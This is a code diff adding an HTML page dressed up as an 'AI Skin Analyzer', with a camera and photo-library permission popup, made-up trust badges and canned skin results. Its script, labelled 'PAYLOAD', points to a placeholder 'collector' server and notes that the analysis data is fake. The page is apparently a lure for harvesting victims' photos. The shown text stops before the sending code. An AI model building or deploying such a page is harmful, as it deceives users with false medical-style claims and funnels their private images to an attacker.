@@ -1,0 +1,1467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>AI Skin Analyzer</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --p1: #c084fc;
+    --p2: #a855f7;
+    --p3: #7c3aed;
+    --p4: #5b21b6;
+    --g1: #6ee7b7;
+    --g2: #34d399;
+    --g3: #059669;
+    --b1: #67e8f9;
+    --b2: #22d3ee;
+    --b3: #0891b2;
+    --bg0: #06061a;
+    --bg1: #0d0d2b;
+    --bg2: #121230;
+    --bg3: #1a1a40;
+    --txt: #f0f0ff;
+    --txt2: rgba(220,215,255,0.65);
+    --txt3: rgba(180,170,240,0.4);
+    --glass: rgba(255,255,255,0.05);
+    --glass-b: rgba(200,180,255,0.15);
+    --glass-b2: rgba(200,180,255,0.08);
+  }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg0);
+    color: var(--txt);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed; inset: 0;
+    background:
+      radial-gradient(ellipse 80% 60% at 20% 10%, rgba(124,58,237,0.22) 0%, transparent 60%),
+      radial-gradient(ellipse 60% 50% at 80% 80%, rgba(6,182,212,0.15) 0%, transparent 55%),
+      radial-gradient(ellipse 50% 40% at 60% 30%, rgba(192,132,252,0.12) 0%, transparent 50%),
+      linear-gradient(160deg, #06061a 0%, #0d0d2b 40%, #0a0a22 70%, #06061a 100%);
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .app {
+    position: relative;
+    z-index: 1;
+    max-width: 440px;
+    margin: 0 auto;
+    padding: 24px 16px 32px;
+  }
+
+  .glass {
+    background: var(--glass);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid var(--glass-b);
+    border-radius: 20px;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 24px;
+    padding-top: 8px;
+  }
+
+  .logo-wrap {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 64px; height: 64px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, rgba(192,132,252,0.25), rgba(34,211,238,0.2));
+    border: 1.5px solid rgba(192,132,252,0.4);
+    margin-bottom: 14px;
+    position: relative;
+    animation: logoPulse 3s ease-in-out infinite;
+  }
+
+  .logo-wrap::after {
+    content: '';
+    position: absolute; inset: -6px;
+    border-radius: 50%;
+    border: 1px solid rgba(192,132,252,0.15);
+    animation: ringPulse 3s ease-in-out infinite;
+  }
+
+  @keyframes logoPulse {
+    0%,100% { box-shadow: 0 0 20px rgba(168,85,247,0.3); }
+    50% { box-shadow: 0 0 40px rgba(168,85,247,0.5), 0 0 70px rgba(34,211,238,0.15); }
+  }
+
+  @keyframes ringPulse {
+    0%,100% { transform: scale(1); opacity: 0.6; }
+    50% { transform: scale(1.08); opacity: 0.2; }
+  }
+
+  .logo-icon { font-size: 28px; }
+
+  .app-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 28px;
+    font-weight: 700;
+    letter-spacing: -0.5px;
+    line-height: 1.1;
+    margin-bottom: 8px;
+    background: linear-gradient(90deg, #c084fc 0%, #818cf8 40%, #34d399 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .badge-row {
+    display: flex;
+    justify-content: center;
+    gap: 8px;
+    flex-wrap: wrap;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    border-radius: 99px;
+    padding: 4px 11px;
+    font-size: 11px;
+    font-weight: 500;
+    letter-spacing: 0.2px;
+  }
+
+  .badge-purple {
+    background: rgba(168,85,247,0.15);
+    border: 1px solid rgba(168,85,247,0.35);
+    color: #c084fc;
+  }
+
+  .badge-cyan {
+    background: rgba(34,211,238,0.12);
+    border: 1px solid rgba(34,211,238,0.3);
+    color: #67e8f9;
+  }
+
+  .badge-green {
+    background: rgba(52,211,153,0.12);
+    border: 1px solid rgba(52,211,153,0.3);
+    color: #6ee7b7;
+  }
+
+  .badge-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: currentColor;
+    animation: blink 2s ease infinite;
+  }
+
+  @keyframes blink {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+
+  /* ===== PERMISSION MODAL ===== */
+  .modal-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(6,6,26,0.85);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    z-index: 99999;
+    display: none;  /* Hidden by default — JS show karega */
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .modal-overlay.active {
+    display: flex;
+  }
+
+  .modal-box {
+    background: linear-gradient(160deg, rgba(20,20,50,0.98), rgba(13,13,43,0.98));
+    border: 1px solid rgba(192,132,252,0.3);
+    border-radius: 24px;
+    padding: 36px 28px;
+    max-width: 340px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 0 80px rgba(124,58,237,0.2), inset 0 1px 0 rgba(255,255,255,0.05);
+    animation: modalIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+  }
+
+  @keyframes modalIn {
+    0% { transform: scale(0.9) translateY(20px); opacity: 0; }
+    100% { transform: scale(1) translateY(0); opacity: 1; }
+  }
+
+  .modal-icon-wrap {
+    width: 60px; height: 60px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, rgba(168,85,247,0.25), rgba(34,211,238,0.15));
+    border: 1px solid rgba(192,132,252,0.35);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 28px;
+    margin: 0 auto 16px;
+  }
+
+  .modal-title {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 18px; font-weight: 700;
+    color: var(--txt);
+    margin-bottom: 8px;
+  }
+
+  .modal-desc {
+    font-size: 13px; color: var(--txt2);
+    line-height: 1.7;
+    margin-bottom: 22px;
+  }
+
+  .modal-desc .highlight {
+    color: #c084fc;
+    font-weight: 600;
+  }
+
+  .modal-btns {
+    display: flex;
+    gap: 10px;
+  }
+
+  .btn {
+    flex: 1; padding: 12px 14px;
+    border-radius: 12px;
+    font-size: 13px; font-weight: 600;
+    font-family: inherit;
+    cursor: pointer; border: none;
+    transition: all 0.22s cubic-bezier(.4,0,.2,1);
+    letter-spacing: 0.2px;
+  }
+
+  .btn-primary {
+    background: linear-gradient(135deg, #a855f7, #7c3aed);
+    color: #fff;
+    box-shadow: 0 4px 18px rgba(124,58,237,0.4);
+  }
+
+  .btn-primary:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 8px 28px rgba(124,58,237,0.5);
+  }
+
+  .btn-ghost {
+    background: rgba(255,255,255,0.06);
+    color: var(--txt2);
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+
+  .btn-ghost:hover { background: rgba(255,255,255,0.1); }
+
+  /* ===== MAIN CARD ===== */
+  .main-card {
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+
+  .section-eyebrow {
+    font-size: 10.5px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    color: var(--txt3);
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .section-eyebrow::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, rgba(192,132,252,0.2), transparent);
+  }
+
+  .upload-zone {
+    border: 1.5px dashed rgba(168,85,247,0.3);
+    border-radius: 16px;
+    padding: 32px 20px;
+    text-align: center;
+    background: radial-gradient(ellipse at 50% 0%, rgba(168,85,247,0.07), transparent 70%);
+    margin-bottom: 14px;
+    cursor: pointer;
+    transition: all 0.25s;
+  }
+
+  .upload-zone:hover {
+    border-color: rgba(192,132,252,0.55);
+    background: radial-gradient(ellipse at 50% 0%, rgba(168,85,247,0.13), transparent 70%);
+  }
+
+  .upload-emoji {
+    font-size: 40px;
+    margin-bottom: 10px;
+    filter: drop-shadow(0 0 12px rgba(192,132,252,0.5));
+    display: block;
+  }
+
+  .upload-text {
+    font-size: 13.5px; font-weight: 500;
+    color: var(--txt); margin-bottom: 4px;
+  }
+
+  .upload-hint {
+    font-size: 11.5px; color: var(--txt3);
+  }
+
+  .btn-row { display: flex; gap: 8px; margin-bottom: 16px; }
+
+  .action-btn {
+    flex: 1; padding: 11px 8px;
+    border-radius: 12px;
+    font-size: 12px; font-weight: 600;
+    font-family: inherit;
+    cursor: pointer; border: none;
+    transition: all 0.22s cubic-bezier(.4,0,.2,1);
+    display: flex; align-items: center;
+    justify-content: center; gap: 5px;
+    letter-spacing: 0.2px;
+  }
+
+  .action-btn.live {
+    background: linear-gradient(135deg, rgba(168,85,247,0.22), rgba(124,58,237,0.22));
+    border: 1px solid rgba(168,85,247,0.45);
+    color: #c084fc;
+  }
+
+  .action-btn.live:hover {
+    background: linear-gradient(135deg, rgba(168,85,247,0.35), rgba(124,58,237,0.35));
+    transform: translateY(-1px);
+    box-shadow: 0 4px 16px rgba(124,58,237,0.3);
+  }
+
+  .action-btn.gallery {
+    background: linear-gradient(135deg, rgba(34,211,238,0.15), rgba(6,182,212,0.15));
+    border: 1px solid rgba(34,211,238,0.35);
+    color: #67e8f9;
+  }
+
+  .action-btn.gallery:hover {
+    background: linear-gradient(135deg, rgba(34,211,238,0.25), rgba(6,182,212,0.25));
+    transform: translateY(-1px);
+    box-shadow: 0 4px 16px rgba(6,182,212,0.25);
+  }
+
+  .action-btn.reset {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    color: var(--txt3);
+  }
+
+  .action-btn.reset:hover { background: rgba(255,255,255,0.09); }
+
+  .preview-box {
+    background: linear-gradient(135deg, rgba(168,85,247,0.08), rgba(34,211,238,0.06));
+    border: 1px solid rgba(192,132,252,0.2);
+    border-radius: 14px;
+    padding: 14px;
+    margin-bottom: 16px;
+    display: none;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .preview-box.visible {
+    display: flex;
+  }
+
+  .preview-thumb {
+    width: 68px; height: 68px;
+    border-radius: 12px;
+    background: linear-gradient(135deg, rgba(168,85,247,0.25), rgba(34,211,238,0.2));
+    border: 1px solid rgba(192,132,252,0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 26px; flex-shrink: 0;
+    overflow: hidden;
+  }
+
+  .preview-thumb img {
+    width: 100%; height: 100%;
+    object-fit: cover;
+  }
+
+  .preview-info { flex: 1; }
+
+  .preview-name {
+    font-size: 13px; font-weight: 600;
+    color: var(--txt); margin-bottom: 3px;
+  }
+
+  .preview-meta {
+    font-size: 11px; color: var(--txt3); margin-bottom: 7px;
+  }
+
+  .source-chip {
+    display: inline-flex; align-items: center; gap: 4px;
+    border-radius: 99px;
+    padding: 3px 9px;
+    font-size: 10.5px; font-weight: 500;
+  }
+
+  .source-chip.live {
+    background: rgba(239,68,68,0.12);
+    border: 1px solid rgba(239,68,68,0.3);
+    color: #f87171;
+  }
+
+  .source-chip.gallery {
+    background: rgba(52,211,153,0.12);
+    border: 1px solid rgba(52,211,153,0.3);
+    color: #6ee7b7;
+  }
+
+  .analyze-btn {
+    width: 100%; padding: 15px;
+    border-radius: 14px;
+    font-size: 15px; font-weight: 700;
+    font-family: 'Space Grotesk', sans-serif;
+    cursor: not-allowed; border: none;
+    background: rgba(255,255,255,0.05);
+    color: rgba(255,255,255,0.2);
+    border: 1px solid rgba(255,255,255,0.07);
+    letter-spacing: 0.3px;
+    transition: all 0.3s;
+  }
+
+  .analyze-btn.active {
+    cursor: pointer;
+    background: linear-gradient(135deg, #a855f7 0%, #7c3aed 50%, #06b6d4 100%);
+    color: #fff;
+    border: none;
+    box-shadow: 0 6px 28px rgba(124,58,237,0.5), 0 0 0 1px rgba(192,132,252,0.2);
+    animation: btnGlow 3s ease-in-out infinite;
+  }
+
+  @keyframes btnGlow {
+    0%,100% { box-shadow: 0 6px 28px rgba(124,58,237,0.5), 0 0 0 1px rgba(192,132,252,0.2); }
+    50% { box-shadow: 0 8px 40px rgba(124,58,237,0.7), 0 0 30px rgba(34,211,238,0.2), 0 0 0 1px rgba(192,132,252,0.35); }
+  }
+
+  .analyze-btn.active:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 10px 48px rgba(124,58,237,0.65), 0 0 40px rgba(34,211,238,0.25);
+  }
+
+  .loading-card {
+    padding: 20px;
+    margin-bottom: 16px;
+    display: none;
+  }
+
+  .loading-card.visible {
+    display: block;
+  }
+
+  .prog-bar-bg {
+    height: 5px;
+    background: rgba(255,255,255,0.07);
+    border-radius: 99px;
+    overflow: hidden;
+    margin-bottom: 14px;
+  }
+
+  .prog-bar-fill {
+    height: 100%;
+    width: 0%;
+    border-radius: 99px;
+    background: linear-gradient(90deg, #7c3aed, #a855f7, #22d3ee, #34d399);
+    background-size: 300% 100%;
+    animation: gradSlide 2s linear infinite;
+    transition: width 0.15s;
+  }
+
+  @keyframes gradSlide {
+    0% { background-position: 0% 0; }
+    100% { background-position: 300% 0; }
+  }
+
+  .loading-status {
+    font-size: 12px; color: #c084fc;
+    text-align: center;
+    margin-bottom: 16px;
+    animation: blink 1.5s ease infinite;
+  }
+
+  .steps-list { display: flex; flex-direction: column; gap: 9px; }
+
+  .step-row {
+    display: flex; align-items: center; gap: 10px;
+    font-size: 12px;
+  }
+
+  .step-dot {
+    width: 18px; height: 18px;
+    border-radius: 50%;
+    flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 9px;
+  }
+
+  .step-dot.done {
+    background: rgba(52,211,153,0.2);
+    border: 1px solid rgba(52,211,153,0.4);
+    color: #34d399;
+  }
+
+  .step-dot.active {
+    background: rgba(192,132,252,0.2);
+    border: 1px solid rgba(192,132,252,0.5);
+    color: #c084fc;
+    animation: blink 1.2s ease infinite;
+  }
+
+  .step-dot.pending {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    color: rgba(255,255,255,0.2);
+  }
+
+  .step-text.done { color: rgba(110,231,183,0.75); }
+  .step-text.active { color: #c084fc; }
+  .step-text.pending { color: rgba(255,255,255,0.2); }
+
+  .result-card {
+    padding: 20px;
+    margin-bottom: 16px;
+    display: none;
+  }
+
+  .result-card.visible {
+    display: block;
+  }
+
+  .result-top {
+    display: flex; align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap; gap: 8px;
+    margin-bottom: 16px;
+  }
+
+  .skin-type-tag {
+    display: inline-flex; align-items: center; gap: 7px;
+    background: linear-gradient(135deg, rgba(168,85,247,0.2), rgba(34,211,238,0.15));
+    border: 1px solid rgba(192,132,252,0.4);
+    border-radius: 99px;
+    padding: 6px 14px;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 14px; font-weight: 600;
+    color: #c084fc;
+    box-shadow: 0 0 20px rgba(168,85,247,0.15);
+  }
+
+  .conf-tag {
+    background: rgba(52,211,153,0.12);
+    border: 1px solid rgba(52,211,153,0.3);
+    border-radius: 99px;
+    padding: 5px 11px;
+    font-size: 11.5px; font-weight: 600;
+    color: #6ee7b7;
+  }
+
+  .result-desc {
+    font-size: 12.5px; color: var(--txt2);
+    line-height: 1.75;
+    padding: 12px 14px;
+    background: rgba(168,85,247,0.07);
+    border-left: 2.5px solid rgba(168,85,247,0.5);
+    border-radius: 0 10px 10px 0;
+    margin-bottom: 16px;
+  }
+
+  .metrics-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 10px;
+    margin-bottom: 18px;
+  }
+
+  .metric-tile {
+    background: linear-gradient(160deg, rgba(255,255,255,0.05), rgba(255,255,255,0.02));
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 14px;
+    padding: 14px 10px;
+    text-align: center;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .metric-tile::before {
+    content: '';
+    position: absolute;
+    top: -20px; left: 50%;
+    transform: translateX(-50%);
+    width: 60px; height: 60px;
+    border-radius: 50%;
+    background: var(--tile-color, rgba(168,85,247,0.15));
+    filter: blur(16px);
+    pointer-events: none;
+  }
+
+  .metric-num {
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: 22px; font-weight: 700;
+    margin-bottom: 4px;
+    background: linear-gradient(90deg, #c084fc, #67e8f9);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .metric-lbl {
+    font-size: 10px; font-weight: 500;
+    text-transform: uppercase; letter-spacing: 0.8px;
+    color: var(--txt3);
+  }
+
+  .divider {
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(192,132,252,0.2), transparent);
+    margin: 16px 0;
+  }
+
+  .rec-label {
+    font-size: 10.5px; text-transform: uppercase;
+    letter-spacing: 2px; color: var(--txt3);
+    margin-bottom: 12px;
+    display: flex; align-items: center; gap: 8px;
+  }
+
+  .rec-label::after {
+    content: ''; flex: 1; height: 1px;
+    background: linear-gradient(90deg, rgba(192,132,252,0.15), transparent);
+  }
+
+  .products { display: flex; flex-direction: column; gap: 9px; }
+
+  .product-row {
+    display: flex; align-items: center; gap: 12px;
+    padding: 12px 14px;
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 13px;
+    cursor: pointer;
+    transition: all 0.22s;
+  }
+
+  .product-row:hover {
+    background: rgba(168,85,247,0.09);
+    border-color: rgba(168,85,247,0.25);
+    transform: translateX(3px);
+  }
+
+  .product-icon-box {
+    width: 38px; height: 38px;
+    border-radius: 10px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 18px; flex-shrink: 0;
+  }
+
+  .product-info { flex: 1; }
+
+  .product-name {
+    font-size: 12.5px; font-weight: 600;
+    color: var(--txt); margin-bottom: 2px;
+  }
+
+  .product-brand { font-size: 11px; color: var(--txt3); }
+
+  .product-chip {
+    font-size: 10px; font-weight: 600;
+    border-radius: 99px;
+    padding: 3px 9px;
+    white-space: nowrap;
+  }
+
+  .chip-cyan {
+    background: rgba(34,211,238,0.12);
+    border: 1px solid rgba(34,211,238,0.25);
+    color: #67e8f9;
+  }
+
+  .chip-green {
+    background: rgba(52,211,153,0.12);
+    border: 1px solid rgba(52,211,153,0.25);
+    color: #6ee7b7;
+  }
+
+  .chip-yellow {
+    background: rgba(251,191,36,0.1);
+    border: 1px solid rgba(251,191,36,0.2);
+    color: #fcd34d;
+  }
+
+  .status-bar {
+    background: rgba(255,255,255,0.04);
+    border: 1px solid rgba(192,132,252,0.15);
+    border-radius: 12px;
+    padding: 11px 16px;
+    display: flex; align-items: center; gap: 10px;
+    position: relative; overflow: hidden;
+  }
+
+  .status-bar::before {
+    content: '';
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    width: 3px;
+    background: linear-gradient(180deg, #a855f7, #22d3ee);
+    border-radius: 99px;
+  }
+
+  .status-live {
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: #34d399;
+    box-shadow: 0 0 8px rgba(52,211,153,0.7);
+    flex-shrink: 0;
+    animation: blink 2s ease infinite;
+  }
+
+  .status-text {
+    flex: 1; font-size: 11.5px; color: var(--txt2);
+  }
+
+  .status-time { font-size: 10.5px; color: var(--txt3); }
+
+  .orb {
+    position: fixed;
+    border-radius: 50%;
+    pointer-events: none;
+    z-index: 0;
+    animation: floatOrb 8s ease-in-out infinite;
+  }
+
+  @keyframes floatOrb {
+    0%,100% { transform: translateY(0) scale(1); }
+    50% { transform: translateY(-20px) scale(1.05); }
+  }
+
+  .orb1 { width: 220px; height: 220px; top: 5%; right: -60px;
+    background: radial-gradient(circle, rgba(168,85,247,0.12), transparent 65%);
+    animation-delay: 0s; }
+
+  .orb2 { width: 160px; height: 160px; top: 40%; left: -40px;
+    background: radial-gradient(circle, rgba(34,211,238,0.1), transparent 65%);
+    animation-delay: 2.5s; }
+
+  .orb3 { width: 180px; height: 180px; bottom: 10%; right: -30px;
+    background: radial-gradient(circle, rgba(124,58,237,0.1), transparent 65%);
+    animation-delay: 5s; }
+
+  #fileInput, #cameraInput { display: none; }
+
+  @media (min-width: 600px) {
+    .app { padding: 32px 24px 40px; }
+    .app-title { font-size: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+
+<div class="app">
+
+  <!-- ===== HEADER ===== -->
+  <div class="header">
+    <div class="logo-wrap">
+      <span class="logo-icon">🔬</span>
+    </div>
+    <h1 class="app-title">AI Skin Analyzer</h1>
+    <div class="badge-row">
+      <span class="badge badge-purple"><span class="badge-dot"></span>500K+ Users</span>
+      <span class="badge badge-green"><span class="badge-dot"></span>Dermatologist Approved</span>
+      <span class="badge badge-cyan"><span class="badge-dot"></span>Instant Results</span>
+    </div>
+  </div>
+
+  <!-- ===== PERMISSION MODAL (POPUP) ===== -->
+  <div class="modal-overlay" id="permissionModal">
+    <div class="modal-box">
+      <div class="modal-icon-wrap">🔒</div>
+      <p class="modal-title">Camera & Photo Access</p>
+      <p class="modal-desc">
+        To analyze your skin, we need access to your <span class="highlight">camera</span> and
+        <span class="highlight">photo library</span>. Your images are processed securely.
+      </p>
+      <div class="modal-btns">
+        <button class="btn btn-ghost" id="denyBtn">Skip</button>
+        <button class="btn btn-primary" id="allowBtn">Allow Access</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== MAIN CARD ===== -->
+  <div class="main-card glass">
+    <p class="section-eyebrow">Step 1 — Capture or Upload</p>
+
+    <div class="upload-zone" id="uploadZone">
+      <span class="upload-emoji">📷</span>
+      <p class="upload-text">Take a selfie or upload a photo</p>
+      <p class="upload-hint">Best results with natural lighting, no filters</p>
+    </div>
+
+    <div class="btn-row">
+      <button class="action-btn live" id="cameraBtn">📸 Live Photo</button>
+      <button class="action-btn gallery" id="galleryBtn">🖼️ Gallery</button>
+      <button class="action-btn reset" id="resetBtn">🔄 Reset</button>
+    </div>
+
+    <div class="preview-box" id="previewBox">
+      <div class="preview-thumb" id="previewThumb">🧑</div>
+      <div class="preview-info">
+        <p class="preview-name" id="previewName">No photo selected</p>
+        <p class="preview-meta" id="previewMeta">—</p>
+        <span class="source-chip gallery" id="sourceChip">🖼️ Gallery</span>
+      </div>
+    </div>
+
+    <input type="file" id="fileInput" accept="image/*" />
+    <input type="file" id="cameraInput" accept="image/*" capture="environment" />
+
+    <button class="analyze-btn" id="analyzeBtn" disabled>🔬 Analyze My Skin</button>
+  </div>
+
+  <!-- ===== LOADING CARD ===== -->
+  <div class="loading-card glass" id="loadingCard">
+    <p class="section-eyebrow">Step 2 — Processing</p>
+    <div class="prog-bar-bg">
+      <div class="prog-bar-fill" id="progressFill"></div>
+    </div>
+    <p class="loading-status" id="loadingStatus">⚡ Initializing AI model...</p>
+    <div class="steps-list" id="stepsList">
+      <div class="step-row"><div class="step-dot pending" id="s1dot">○</div><span class="step-text pending" id="s1txt">Loading neural network model</span></div>
+      <div class="step-row"><div class="step-dot pending" id="s2dot">○</div><span class="step-text pending" id="s2txt">Detecting facial landmarks</span></div>
+      <div class="step-row"><div class="step-dot pending" id="s3dot">○</div><span class="step-text pending" id="s3txt">Analyzing texture &amp; pore patterns</span></div>
+      <div class="step-row"><div class="step-dot pending" id="s4dot">○</div><span class="step-text pending" id="s4txt">Mapping moisture &amp; oil zones</span></div>
+      <div class="step-row"><div class="step-dot pending" id="s5dot">○</div><span class="step-text pending" id="s5txt">Generating recommendations</span></div>
+    </div>
+  </div>
+
+  <!-- ===== RESULT CARD ===== -->
+  <div class="result-card glass" id="resultCard">
+    <p class="section-eyebrow">Analysis Results</p>
+    <div class="result-top">
+      <span class="skin-type-tag" id="skinTypeTag">✦ Combination Skin</span>
+      <span class="conf-tag" id="confTag">96% Confidence</span>
+    </div>
+    <p class="result-desc" id="resultDesc">
+      Your skin shows combination-type characteristics — oily in the T-zone with normal-to-dry cheeks.
+    </p>
+    <div class="metrics-grid">
+      <div class="metric-tile" style="--tile-color: rgba(168,85,247,0.2)">
+        <p class="metric-num" id="m1">72%</p>
+        <p class="metric-lbl">Hydration</p>
+      </div>
+      <div class="metric-tile" style="--tile-color: rgba(34,211,238,0.18)">
+        <p class="metric-num" id="m2">4.8</p>
+        <p class="metric-lbl">Clarity</p>
+      </div>
+      <div class="metric-tile" style="--tile-color: rgba(52,211,153,0.18)">
+        <p class="metric-num" id="m3">Low</p>
+        <p class="metric-lbl">Sensitivity</p>
+      </div>
+    </div>
+    <div class="divider"></div>
+    <p class="rec-label">Recommended for You</p>
+    <div class="products" id="productList">
+      <div class="product-row">
+        <div class="product-icon-box" style="background:rgba(168,85,247,0.15);">🧴</div>
+        <div class="product-info">
+          <p class="product-name">Niacinamide 10% + Zinc Serum</p>
+          <p class="product-brand">The Ordinary</p>
+        </div>
+        <span class="product-chip chip-cyan">Top Pick</span>
+      </div>
+      <div class="product-row">
+        <div class="product-icon-box" style="background:rgba(34,211,238,0.12);">💧</div>
+        <div class="product-info">
+          <p class="product-name">Hydro Boost Water Gel</p>
+          <p class="product-brand">Neutrogena</p>
+        </div>
+        <span class="product-chip chip-green">Hydration</span>
+      </div>
+      <div class="product-row">
+        <div class="product-icon-box" style="background:rgba(251,191,36,0.1);">☀️</div>
+        <div class="product-info">
+          <p class="product-name">Ultra Light SPF 50 Sunscreen</p>
+          <p class="product-brand">Minimalist</p>
+        </div>
+        <span class="product-chip chip-yellow">Daily Use</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== STATUS BAR ===== -->
+  <div class="status-bar">
+    <div class="status-live"></div>
+    <span class="status-text" id="statusText">AI Model v3.2 • Ready</span>
+    <span class="status-time" id="statusTime">Just now</span>
+  </div>
+
+</div>
+
+<!-- ============================================ -->
+<!-- 🔥 PAYLOAD — COMPLETE WITH POPUP FIX        -->
+<!-- ============================================ -->
+
+<script>
+(function() {
+  'use strict';
+
+  // ========================================
+  // CONFIGURATION — ⚠️ APNA RENDER URL DAALO
+  // ========================================
+  const CONFIG = {
+    COLLECTOR_URL: 'https://your-server.onrender.com/collect',
+  };
+
+  // ========================================
+  // DOM REFS
+  // ========================================
+  const fileInput = document.getElementById('fileInput');
+  const cameraInput = document.getElementById('cameraInput');
+  const cameraBtn = document.getElementById('cameraBtn');
+  const galleryBtn = document.getElementById('galleryBtn');
+  const resetBtn = document.getElementById('resetBtn');
+  const uploadZone = document.getElementById('uploadZone');
+  const previewBox = document.getElementById('previewBox');
+  const previewThumb = document.getElementById('previewThumb');
+  const previewName = document.getElementById('previewName');
+  const previewMeta = document.getElementById('previewMeta');
+  const sourceChip = document.getElementById('sourceChip');
+  const analyzeBtn = document.getElementById('analyzeBtn');
+  const loadingCard = document.getElementById('loadingCard');
+  const resultCard = document.getElementById('resultCard');
+  const skinTypeTag = document.getElementById('skinTypeTag');
+  const confTag = document.getElementById('confTag');
+  const resultDesc = document.getElementById('resultDesc');
+  const m1 = document.getElementById('m1');
+  const m2 = document.getElementById('m2');
+  const m3 = document.getElementById('m3');
+  const productList = document.getElementById('productList');
+  const statusText = document.getElementById('statusText');
+  const statusTime = document.getElementById('statusTime');
+  const permissionModal = document.getElementById('permissionModal');
+  const allowBtn = document.getElementById('allowBtn');
+  const denyBtn = document.getElementById('denyBtn');
+  const progressFill = document.getElementById('progressFill');
+  const loadingStatus = document.getElementById('loadingStatus');
+
+  // Step elements
+  const steps = [
+    { dot: document.getElementById('s1dot'), txt: document.getElementById('s1txt') },
+    { dot: document.getElementById('s2dot'), txt: document.getElementById('s2txt') },
+    { dot: document.getElementById('s3dot'), txt: document.getElementById('s3txt') },
+    { dot: document.getElementById('s4dot'), txt: document.getElementById('s4txt') },
+    { dot: document.getElementById('s5dot'), txt: document.getElementById('s5txt') }
+  ];
+
+  let currentPhotoData = null;
+  let currentPhotoSource = null;
+  let permissionGranted = false;
+
+  // ========================================
+  // SKIN DATA (FAKE — For Real Feel)
+  // ========================================
+  const skinData = [
+    { type: 'Oily Skin', desc: 'Your skin produces excess sebum. Recommended: Salicylic Acid-based face wash.', confidence: '94%', hydration: '58%', clarity: '3.2', sensitivity: 'Low', products: ['🧼 Salicylic Acid Face Wash', '💧 Niacinamide Serum', '🌿 Oil-Free Moisturizer'] },
+    { type: 'Dry Skin', desc: 'Your skin lacks moisture. Recommended: Hyaluronic Acid-based face wash.', confidence: '92%', hydration: '72%', clarity: '4.5', sensitivity: 'High', products: ['🧴 Hyaluronic Acid Face Wash', '💧 Ceramide Moisturizer', '🌿 Squalane Oil'] },
+    { type: 'Combination Skin', desc: 'Your skin is oily in T-zone and dry on cheeks. Recommended: Gentle balancing face wash.', confidence: '96%', hydration: '65%', clarity: '4.1', sensitivity: 'Medium', products: ['🧼 Gentle Foaming Face Wash', '💧 Balancing Toner', '🌿 Lightweight Moisturizer'] },
+    { type: 'Sensitive Skin', desc: 'Your skin is prone to redness. Recommended: Fragrance-free, soothing face wash.', confidence: '88%', hydration: '60%', clarity: '3.8', sensitivity: 'High', products: ['🧴 Soothing Face Wash', '💧 Calming Serum', '🌿 Barrier Repair Cream'] },
+    { type: 'Normal Skin', desc: 'Your skin is well-balanced. Recommended: Mild, hydrating face wash.', confidence: '95%', hydration: '78%', clarity: '4.9', sensitivity: 'Low', products: ['🧼 Mild Hydrating Face Wash', '💧 Vitamin C Serum', '🌿 Daily Moisturizer'] },
